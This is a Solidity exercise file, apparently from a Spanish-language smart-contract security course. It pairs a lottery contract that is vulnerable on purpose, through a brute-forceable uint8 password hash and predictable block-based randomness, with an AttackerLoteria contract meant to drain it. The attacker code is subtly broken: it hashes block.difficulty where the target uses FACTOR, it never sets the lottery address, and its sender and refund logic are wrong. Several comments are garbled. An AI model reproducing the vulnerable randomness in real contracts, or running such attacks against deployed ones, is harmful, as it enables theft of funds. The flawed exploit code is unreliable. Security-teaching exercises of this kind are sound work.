// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * El contrato LoteriaConPassword permite que las personas participen en una lotería
 * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
 *
 * Para poder participar, una persona provee tres elementos:
 * 1. El password
 * 2. Un número (preddicción) de un número entero (uint256)
 * 3. Una cantidad de 1500 o 1500 wei
 *
 * De acuerdo a los tests, el contrato LoteriaConPassword comienza con un balance de 1500 wei o 1500
 * El objetivo es drenar los fondos del contrato LoteriaConPassword
 *
 * Para ello se desarrollará el contrato AttackerLoteria
 * El contrato AttackerLoteria ejecutará el método attack()
 * Al hacerlo, participará en la lotería:
 * - apostando 1500 wei o 1500 (según el require de LoteriaConPassword)
 * - "adivinando" el número ganador
 * - "conociendo" el password
 *
 * La operación termina cuando el contrato AttackerLoteria gana la lotería
 *
 * Nota:
 * - No cambiar la firma del método attack()
 * - Asumir que cuando attack() es llamado, el contrato AttackerLoteria posee un balance de Ether
 *
 * ejecuar el test con:
 * npx hardhat test test/EjercicioTesting_7.js
 */

contract LoteriaConPassword {
    constructor() payable {}

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(
        uint8 password,
        uint256 _numeroGanador
    ) public payable {
        require(msg.value == 1500, "Cantidad apuesta incorrecta");
        require(
            uint256(keccak256(abi.encodePacked(password))) == FACTOR,
            "No es el hash correcto"
        );

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    tx.origin,
                    block.timestamp,
                    msg.sender
                )
            )
        );

        uint256 numeroGanador = numRandom % 10;

        if (numeroGanador == _numeroGanador) {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }
}
interface ILoteriaConPassword {
    function participarEnLoteria(uint8 password, uint256 numeroGanador) external payable;
    // Declarar cualquier otra función que necesites interactuar con el contrato LoteriaConPassword
}


    // Función para atacar la lotería
    contract AttackerLoteria  {
    // Declarar una variable para almacenar la dirección del contrato LoteriaConPassword
    ILoteriaConPassword public loteria;

    // Constructor para inicializar la dirección del contrato LoteriaConPassword
    // constructor(address _loteriaAddress) {
    //     loteria = ILoteriaConPassword(_loteriaAddress);
    // }

    // Función para atacar la lotería
   function attack(uint8 _password) public payable {
    // Verificar que el valor enviado sea al menos 1500 wei
    require(msg.value >= 1500, "Cantidad insuficiente para apostar");
    
    // Calcular un valor similar a numRandom de la lotería
    uint256 numRandom = uint256(
        keccak256(
            abi.encodePacked(
                block.difficulty,
                msg.value,
                tx.origin,
                block.timestamp,
                msg.sender
            )
        )
    );

    // Adivinar el número ganador basado en el valor similar a numRandom
    uint256 numeroGanador = numRandom % 10;

    // Llamar a la función participarEnLoteria del contrato LoteriaConPassword
    loteria.participarEnLoteria{value: msg.value}(_password, numeroGanador);
    
    // Transferir cualquier exceso de ether de vuelta al remitente
    if (msg.value > 1500) {
        payable(msg.sender).transfer(msg.value - 1500);
    }
    
    // Transferir el ether restante del contrato AttackerLoteria al remitente
    payable(msg.sender).transfer(address(this).balance);
}
}
